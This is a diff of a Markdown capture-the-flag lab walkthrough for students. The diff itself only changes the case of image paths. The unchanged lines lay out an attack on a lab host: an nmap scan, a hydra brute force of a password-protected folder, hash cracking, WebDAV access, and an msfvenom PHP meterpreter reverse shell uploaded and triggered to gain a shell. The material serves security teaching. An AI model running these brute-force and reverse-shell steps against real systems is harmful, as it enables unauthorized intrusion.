@@ -12,13 +12,13 @@ In order to find the IP address of the machine, you will need to use Nmap to sca
 
 - Open the terminal and run: `nmap 192.168.1.0/24`
 
-   ![1_nmap.png](images/1_nmap.png)
+   ![1_nmap.png](Images/1_nmap.png)
 
 From the Nmap scan we can see that port `80` is open. Open a web browser and type the IP address of the machine into the address bar.
 
 - Open a web browser and navigate to `192.168.1.105` and press `enter`.
 
-   ![2_web_discovery.png](images/2_web_discovery.png)
+   ![2_web_discovery.png](Images/2_web_discovery.png)
 
 ### Step 2: Locate the hidden directory on the server.
 
@@ -33,7 +33,7 @@ From the Nmap scan we can see that port `80` is open. Open a web browser and typ
 
 - The directory asks for authentication in order to access it. Reading the authentication method, it says "For ashton's eyes only."
 
-    ![4_password_protect.png](images/4_password_protect.png)
+    ![4_password_protect.png](Images/4_password_protect.png)
 
 ### Step 3: Brute force the password for the hidden directory.
 
@@ -43,21 +43,21 @@ Because the folder is password protected, we need to either guess the password o
 
   - Type: `hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`
 
-      ![5_hydra_sytanx.png](images/5_hydra_sytanx.png)
+      ![5_hydra_sytanx.png](Images/5_hydra_sytanx.png)
 
 - The brute force attack may take some time. Once it finishes, you'll find the username is `ashton` and the password is `leopoldo`.
 
-    ![6_password_discovery.png](images/6_password_discovery.png)
+    ![6_password_discovery.png](Images/6_password_discovery.png)
 
 - Go back to the web browser and use the credentials to log in. Click the file `connecting_to_webdav`.
 
-   ![7_inside_secret_directory.png](images/7_inside_secret_directory.png)
+   ![7_inside_secret_directory.png](Images/7_inside_secret_directory.png)
 
 - Located inside of the WebDAV file are instructions on how to connect to the WebDAV directory, as well the user's username and hashed password.
 
-   ![webdav_instructions.png](images/8b_webdav_instructions.png)
+   ![webdav_instructions.png](Images/8b_webdav_instructions.png)
 
-   ![webdav_hash.png](images/8a_webdav_hash.png)
+   ![webdav_hash.png](Images/8a_webdav_hash.png)
 
 **Step 4: Connect to the server via Webdav**
 
@@ -65,7 +65,7 @@ There are several ways to break the password hash. Here, we simply used Crack St
 
 Navigate to `https://crackstation.net`; paste the password hash and fill out the CAPTCHA; and click **Crack Hashes**.
 
-   ![cracked](images/9_password_hash.png)
+   ![cracked](Images/9_password_hash.png)
 
   - The password is revealed as: `linux4u`
 
@@ -80,7 +80,7 @@ In addition, the instructions show an outdated IP address that the students will
   - Click `Browse Network`.
   - In the URL bar, type: `dav://192.168.1.105/webdav`, and enter the credentials to log in.
 
-    ![10_connect_to_webdav.png](images/10_connect_to_webdav.png)
+    ![10_connect_to_webdav.png](Images/10_connect_to_webdav.png)
 
 ### Step 6: Upload a PHP reverse shell payload.
 
@@ -88,7 +88,7 @@ In addition, the instructions show an outdated IP address that the students will
 
   - `msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php`
 
-   ![11_msfvenom.png](images/11_msfvenom.png)
+   ![11_msfvenom.png](Images/11_msfvenom.png)
 
 - Run this series of commands to set up a listener:
 
@@ -99,20 +99,20 @@ In addition, the instructions show an outdated IP address that the students will
   - `set LHOST 192.168.1.90`
   - `exploit`
 
-    ![12_listener.png](images/12_listener.png)
+    ![12_listener.png](Images/12_listener.png)
 
 - Place the reverse shell onto the WebdDAV directory.
 
-    ![13_implanting_the_reverse.png](images/13_implanting_the_reverse.png)
+    ![13_implanting_the_reverse.png](Images/13_implanting_the_reverse.png)
 
 - Now that you're logged in, connect to the webdav folder by navigating to `192.168.1.105/webdav`. Use the credentials that you used before, `user:ryan pass:linux4u`.
 
-  ![14_webdav.png](images/14_webdav.png)
+  ![14_webdav.png](Images/14_webdav.png)
 
 - Navigate to where you first uploaded the reverse shell and click it to activate it. If it seems like the browser is hanging or loading, that means it has worked.
     - If it asks you if you'd like to save or open the PDF file, start again at the beginning of Step 5.
 
-  ![15_activiating_the_shell.png](images/15_activiating_the_shell.png)
+  ![15_activiating_the_shell.png](Images/15_activiating_the_shell.png)
 
 ### Step 7: Find and capture the flag.
 
@@ -126,7 +126,7 @@ In addition, the instructions show an outdated IP address that the students will
 
 Students can read the file, once located, with `cat`.
 
-   ![16_view_files](images/16_view_files.png)
+   ![16_view_files](Images/16_view_files.png)
 
 | :warning: **Important Checkpoint** :warning:                     |
 |------------------------------------------------------------------|
